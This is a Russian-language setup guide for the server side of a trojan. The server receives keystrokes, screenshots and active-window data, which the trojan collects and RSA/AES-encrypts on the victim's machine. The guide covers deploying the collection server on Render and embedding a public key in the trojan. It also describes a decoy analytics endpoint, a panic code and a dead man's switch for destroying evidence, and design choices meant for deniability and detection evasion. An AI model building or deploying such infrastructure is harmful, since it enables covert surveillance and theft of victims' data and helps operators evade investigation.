# Руководство по настройке модуля телеметрии v2

## Архитектура с клиентским RSA шифрованием

### Ключевые принципы

1. **Сервер НЕ расшифровывает данные** - только хранит зашифрованный payload
2. **Все данные шифруются на клиенте** (троян) перед отправкой
3. **Двухфазный handshake** - init для получения response_key
4. **Perfect forward secrecy** - каждый клиент получает уникальный response_key
5. **Дениабельность** - сервер хранит только шифротекст

### Схема работы

```
Троян (клиент)            Сервер (Render)              Оператор
      |                          |                            |
[Генерация RSA]           [Хранит encrypted]         [Скачивает данные]
[Шифрует AES-GCM]         [Не расшифровывает]         [Расшифровывает локально]
[Отправляет]              [Не знает ключи]           [Имеет все ключи]
```

## Критические шаги настройки

### 1. Установка зависимостей

```bash
npm install sharp @types/sharp @nestjs/schedule
```

### 2. Создание таблиц в Render PostgreSQL

1. Получите connection string для вашей PostgreSQL БД в Render Dashboard
2. Выполните SQL миграцию из файла `database_migration_telemetry_v2.sql`:
   - Через psql: `psql <TELEMETRY_DATABASE_URL> -f database_migration_telemetry_v2.sql`
   - Или через Render Dashboard → Database → Connect → Query Editor

**ВАЖНО:** Используйте файл `database_migration_telemetry_v2.sql`, а не старую версию!

### 3. Установка переменных окружения в Render Dashboard

Все секретные переменные должны быть установлены **вручную** в Render Dashboard:

1. Перейдите в ваш сервис на Render.com
2. Откройте раздел "Environment"
3. Добавьте следующие переменные:

#### Обязательные переменные:

- `SIGNATURE_SALT` - Минимум 32 случайных символа (для HMAC-SHA256 валидации)
- `IP_SALT` - Соль для хэширования IP адресов
- `PANIC_CODE` - Код для активации самоуничтожения
- `TELEMETRY_DATABASE_URL` - Connection string для Render PostgreSQL (формат: `postgresql://user:password@host:port/database`)

#### Опциональные переменные:

- `ALLOWED_HOSTS` - SHA256 хэши hostname через запятую (если нужен whitelist)
- `TELEMETRY_TIMESTAMP_TTL` - TTL в миллисекундах (по умолчанию 300000 = 5 минут)
- `TELEMETRY_RATE_LIMIT` - Лимит запросов в час (по умолчанию 100)

**УДАЛЕНО:**
- `ENCRYPTION_MASTER_KEY` - больше не нужен (шифрование на клиенте)
- `TELEMETRY_STORAGE_BASE_URL` - больше не нужен (нет файловой системы)
- `TELEMETRY_STORAGE_SECRET` - больше не нужен (нет файловой системы)

### 4. Генерация секретов

#### SIGNATURE_SALT:
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

#### IP_SALT:
```bash
node -e "console.log(require('crypto').randomBytes(16).toString('hex'))"
```

#### PANIC_CODE:
```bash
node -e "console.log(require('crypto').randomBytes(16).toString('hex'))"
```

#### TELEMETRY_DATABASE_URL:
Получите connection string из Render Dashboard:
1. Перейдите в ваш PostgreSQL сервис
2. Скопируйте "Internal Database URL" или "External Database URL"
3. Формат: `postgresql://user:password@host:port/database`

### 5. Генерация RSA ключей для трояна

На вашей локальной машине (НЕ на сервере!):

```bash
# Генерация приватного ключа (только у вас!)
openssl genrsa -out private_key.pem 2048

# Генерация публичного ключа (встраивается в троян)
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

**КРИТИЧНО:**
- Приватный ключ (`private_key.pem`) - ТОЛЬКО у вас, для расшифровки данных
- Публичный ключ (`public_key.pem`) - встраивается в троян для шифрования response_key

### 6. Проверка работоспособности

После настройки проверьте:

1. Health endpoint: `GET /api/health`
2. Init endpoint: `POST /api/v1/init` (с тестовым публичным ключом)
3. Фейковый эндпоинт: `POST /api/analytics` (должен всегда возвращать успех)

### 7. Важные замечания

- **НИКОГДА** не коммитьте секретные переменные в git
- Все секреты должны быть установлены только в Render Dashboard
- **Сервер НЕ расшифровывает данные** - только хранит encrypted_payload
- Все данные (keystrokes, screenshots, active_window) хранятся в одном поле `encrypted_payload` в БД
- Авто-деплой отключен в `render.yaml` (`autoDeploy: false`)
- Нет файловой системы - всё в БД как BYTEA

### 8. Двухфазный handshake

#### Фаза 1: Инициализация (`POST /api/v1/init`)

Троян отправляет:
```json
{
  "client_public_key": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----",
  "timestamp": "2024-01-15T14:30:25.123Z",
  "hostname": "DESKTOP-ABC123"
}
```

Сервер возвращает:
```json
{
  "status": "ok",
  "client_id": "uuid",
  "response_key": "base64_encrypted_response_key"
}
```

#### Фаза 2: Отправка данных (`POST /api/v1/telemetry`)

Троян отправляет:
```json
{
  "client_id": "uuid",
  "data": "base64_aes_gcm_encrypted_payload",
  "timestamp": "2024-01-15T14:30:25.123Z"
}
```

Сервер сохраняет `data` в БД БЕЗ расшифровки.

### 9. Расшифровка данных на локальной машине

Для расшифровки данных вам понадобится:
1. Приватный RSA ключ (`private_key.pem`)
2. response_key для каждого клиента (хранится в БД в зашифрованном виде)
3. Скрипт для расшифровки AES-GCM payload

**ВАЖНО:** Расшифровка выполняется ТОЛЬКО на вашей локальной машине, не на сервере!

### 10. Dead Man's Switch

Модуль включает функцию Dead Man's Switch, которая проверяет наличие валидных запросов каждые 24 часа. Если валидных запросов не было 48+ часов, происходит самоуничтожение данных.

Для активации cron задачи добавьте в `telemetry.service.ts` или создайте отдельный сервис с декоратором `@Cron('0 0 */24 * * *')`.

### 11. Автоматическая очистка старых данных

Модуль автоматически очищает:
- Данные старше 30 дней из `telemetry_logs`
- Деактивирует клиентов без активности 7 дней

Вызовите `telemetryService.cleanupOldData()` через cron или вручную.

## Безопасность

- **Zero-knowledge:** Сервер не знает содержимое данных
- **Perfect forward secrecy:** Каждый клиент имеет уникальный response_key
- **Дениабельность:** Сервер хранит только шифротекст
- **Нет подозрительных паттернов:** Нет отдельного запроса за ключом
- **Компрометация сервера:** Не раскрывает данные (только шифротекст)
